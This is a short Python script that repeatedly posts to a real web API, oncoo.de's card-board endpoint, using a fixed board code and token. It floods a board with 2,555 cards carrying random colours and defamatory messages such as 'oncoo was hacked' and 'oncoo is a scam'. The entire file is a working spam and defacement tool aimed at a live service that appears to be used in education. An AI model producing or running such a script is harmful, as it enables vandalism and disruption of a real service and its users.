# Made by Bobby (bugfix4747)

import requests
import json
import os
import random
import asyncio
import time
from colorama import Fore, Back, Style


number = 2555
code = "0rzs"


color = ["gelb", "rot", "gruen", "rosa", "weiss"]
content = ["oncoo was hacked", "oncoo bad",  "oncoo is bad", "oncoo is trash", "oncoo is a scam"]


for i in range(number):
    random_color = random.choice(color)
    random_content = random.choice(content)
    url = f'https://www.oncoo.de/API/Kartenabfrage/API.php?funktion=4&dir={code}&karte=%7B%22ebene%22%3A0%2C%22farbe%22%3A%22{random_color}%22%2C%22inhalt%22%3A%22{random_content}%22%2C%22haeufigkeit%22%3A1%2C%22x%22%3A-11%2C%22y%22%3A-11%2C%22sichtbar%22%3Atrue%2C%22schriftgroesse%22%3A0%2C%22schattenfarbe%22%3A0%7D&token=zou6&_=1726231594955'
    response = requests.post(url)
    print(Fore.GREEN + f"Succesfully {i}/{number}")
